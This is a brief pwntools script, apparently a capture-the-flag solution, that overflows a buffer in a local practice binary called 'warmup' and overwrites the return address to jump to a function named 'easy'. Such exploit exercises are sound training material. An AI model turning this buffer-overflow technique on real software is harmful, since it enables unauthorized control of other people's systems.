from pwn import *

target = process('./warmup')
#gdb.attach(target, gdbscript = 'b *0x4006a3')

# Make the payload
payload = b"0"*0x40 # Overflow the buffer up to the return address
payload += p64(0x40060d) # Overwrite the return address with the address of the `easy` function

# Send the payload
target.sendline(payload)

target.interactive()
